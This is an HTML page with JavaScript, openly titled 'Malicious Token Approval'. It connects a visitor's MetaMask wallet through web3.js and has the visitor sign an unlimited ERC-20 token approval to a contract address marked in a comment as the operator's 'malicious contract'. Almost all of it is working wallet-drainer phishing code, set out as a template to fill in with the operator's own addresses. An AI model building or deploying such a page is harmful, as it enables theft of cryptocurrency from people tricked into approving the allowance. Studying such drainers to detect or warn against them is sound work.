<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Token Approval</title>
</head>
<body>
    <h1>Approve Malicious Token Manager</h1>
    <button id="connectWalletBtn">Connect Wallet</button>
    <button id="approveTokensBtn" style="display:none;">Approve Tokens</button>
    <p id="status"></p>

    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script>
        let web3;
        let userAccount;
        const contractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8"; // Replace with your malicious contract address
        const tokenAddress = "0xb556Deb94276a61b2f749022ca61c9BbBb1A8D5A"; // Replace with your ERC-20 token address
        let token;

        const tokenABI = [
            {
                "constant": false,
                "inputs": [
                    { "name": "spender", "type": "address" },
                    { "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "name": "", "type": "bool" }],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        window.onload = () => {
            console.debug("Page loaded. Checking for MetaMask...");
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                console.debug("MetaMask found. Initializing...");
                init();
            } else {
                alert("MetaMask not found!");
                console.debug("MetaMask not found.");
            }
        };

        async function init() {
            token = new web3.eth.Contract(tokenABI, tokenAddress);
            console.debug("ERC-20 token contract initialized:", token);

            document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
            document.getElementById('approveTokensBtn').addEventListener('click', approveTokens);
        }

        async function connectWallet() {
            try {
                console.debug("Requesting wallet connection...");
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                console.debug("Wallet connected:", userAccount);
                document.getElementById('status').innerText = `Connected: ${userAccount}`;
                document.getElementById('approveTokensBtn').style.display = "inline-block";
            } catch (error) {
                console.error("Error connecting wallet:", error);
            }
        }

        async function approveTokens() {
            try {
                const unlimitedAmount = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
                console.debug("Approving unlimited tokens for:", contractAddress);

                await token.methods.approve(contractAddress, unlimitedAmount).send({ from: userAccount });
                console.debug("Approval successful.");
                document.getElementById('status').innerText = `Approval successful! Unlimited tokens have been approved.`;
            } catch (error) {
                document.getElementById('status').innerText = "Approval failed!";
                console.error("Error during approval:", error);
            }
        }
    </script>
</body>
</html>
